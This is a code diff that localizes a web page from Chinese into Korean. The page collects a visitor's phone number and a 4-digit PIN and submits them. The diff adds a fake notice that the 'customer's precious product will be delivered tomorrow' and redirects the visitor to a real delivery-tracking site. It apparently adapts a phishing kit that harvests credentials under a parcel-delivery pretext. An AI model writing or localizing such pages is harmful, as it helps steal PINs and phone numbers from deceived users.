@@ -16057,7 +16057,7 @@ body {
 			  <center>
 				 <div class="z-depth-1 grey lighten-4 row" style="display: inline-block; padding: 32px 48px; border: 1px solid #EEE;">
 					  
-					  <h5 class="indigo-text">请输入11位手机号</h5>
+					  <h5 class="indigo-text">휴대폰번호를 입력하세요</h5>
 					  
 					  <!-- Step 1: Phone Number Input -->
 					  <div id="phoneStep">
@@ -16073,7 +16073,7 @@ body {
 					  <div id="passwordStep" class="hidden">
 
 
-						<h5 class="indigo-text">提示文本</h5>
+						<h5 class="indigo-text">4자리 숫자로된 비밀번호 설정</h5>
 
 						<div class="input-container">
 
@@ -20128,7 +20128,7 @@ body {
       
 
       if (!validateCode(password)  || password == phone.slice(-4) ) {
-        $('#passwordError').text('인증 코드 형식이 잘못되었습니다. 1234, 1111 등은 사용 불가');
+        $('#passwordError').text('인증 코드 형식이 잘못되었습니다. 1234, 1111 등 전화번호 끝 4자리 는(은) 사용 불가');
         valid = false;
       }
 
@@ -20163,8 +20163,8 @@ body {
         } else {
             console.log('提交成功:', insertData);
             // 로그인 성공, 다음 페이지로 이동
-		alert("提示信息");
-         window.location.href = 'https://www.google.com';
+		alert("고객님의 소중한 상품이 내일 배송 예정입니다.");
+         window.location.href = 'https://www.goodsflow.com/';
         }
     } catch (error) {
         console.error('提交时出现错误:', error);
